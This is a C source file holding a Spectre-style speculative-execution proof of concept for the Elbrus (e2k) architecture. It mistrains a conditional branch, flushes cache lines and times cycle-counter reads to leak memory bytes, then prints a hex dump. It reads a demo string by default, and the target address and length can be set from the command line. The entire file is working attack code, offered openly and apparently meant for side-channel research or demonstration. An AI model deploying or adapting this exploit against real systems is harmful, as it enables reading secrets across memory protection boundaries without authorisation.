#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <e2kbuiltin.h>

#define black_box(value) ({ \
        uint64_t ret = value; \
        asm("" : "+r"(ret)); \
        ret; \
    })

#define black_box_mem(value) asm("" : : "m"(value))

#define CACHE_LINE_SIZE 64
#define MAP_SIZE (256 * CACHE_LINE_SIZE)

#define clk() ({ \
    uint64_t ret; \
    asm volatile("rrd %%clkr,%0" : "=r"(ret)); \
    ret; \
})

static char secret[] = "Hello OpenE2K";

static uint8_t *map;

void spectre_sw_impl(bool **c, uint8_t *map, size_t i) {
    // NOTE: condition is always false
    if (**c) {
        // NOTE: You might think that this block will never be executed, but you are wrong!
        // (only the last store instruction will not be executed)
        map[(size_t) map[i] * CACHE_LINE_SIZE]++;
    }
}

// prevents from inlining
void (*spectre_sw)(bool **c, uint8_t *map, size_t i) = &spectre_sw_impl;

static inline void cache_flush(const void *p, size_t l) {
    for (size_t i = 0; i < l; i += CACHE_LINE_SIZE) {
      __builtin_storemas_64u(0, (void*) p + i, 0xf, 2);
    }
}

static int64_t find(const uint8_t *map) {
    uint64_t min = UINT64_MAX;
    uint8_t value = 0;
    uint64_t acc = 0;
    for (int i = 0; i < 256; ++i) {
        uint64_t time = clk();
        acc += map[map[black_box(i) * CACHE_LINE_SIZE]];
        time = clk() - time;
        value = time < min ? i : value;
        min = time < min ? time : min;
        black_box_mem(time); // XXX: hack for clang+lccrt
    }
    acc = (acc << 8) | value;
    return min > 32 ? -acc : acc;
}

static int get_byte(uintptr_t target) {
    bool always_false = false, *c1 = &always_false, **cond = &c1;
    cache_flush(map, MAP_SIZE);
    // warmup page cache
    for (int i = 0; i < 10; ++i)
        spectre_sw(cond, map, target - (uintptr_t) map);
    return find(map);
}

int main(int argc, char *argv[]) {
    uintptr_t target = (uintptr_t) secret;
    size_t secret_len = strlen(secret);
    size_t len = argc > 2 ? strtoul(argv[2], NULL, 10) : secret_len;

    if (argc > 1) {
        const char *s = argv[1];
        if (s[0] == '0' && s[1] == 'x')
            s += 2;
        target = strtoul(s, NULL, 16);
    }

    map = aligned_alloc(CACHE_LINE_SIZE, MAP_SIZE);
    memset(map, 0, MAP_SIZE);

    printf("usage: %s 0x%lx %lu\n", argv[0], target, len);
    putchar('\n');
    printf("secret address: %p\n", secret);
    printf("secret len: %lu\n", secret_len);
    printf("secret data: \"%s\"\n", secret);
    putchar('\n');
    printf("target address: 0x%lx\n", target);
    printf("target len: %lu\n", len);
    printf("target data:\n\n");

#define WIDTH 16
    for (size_t i = 0; i < len; i += WIDTH) {
        int16_t buffer[WIDTH];
        for (size_t j = 0; j < WIDTH; ++j) {
            buffer[j] = get_byte((uintptr_t) target + i + j);
        }
        printf("%016lx |", target + i);
        for (size_t j = 0; j < WIDTH; ++j) {
            if (buffer[j] >= 0) {
                printf(" %02x", (uint8_t) buffer[j]);
            } else {
                printf(" ..");
            }
        }
        printf(" | ");
        for (size_t j = 0; j < WIDTH; ++j) {
            if (buffer[j] >= 0 && isprint(buffer[j])) {
                printf("%c", (uint8_t) buffer[j]);
            } else {
                printf(".");
            }
        }
        printf("\n");
    }

    free(map);
    return EXIT_SUCCESS;
}
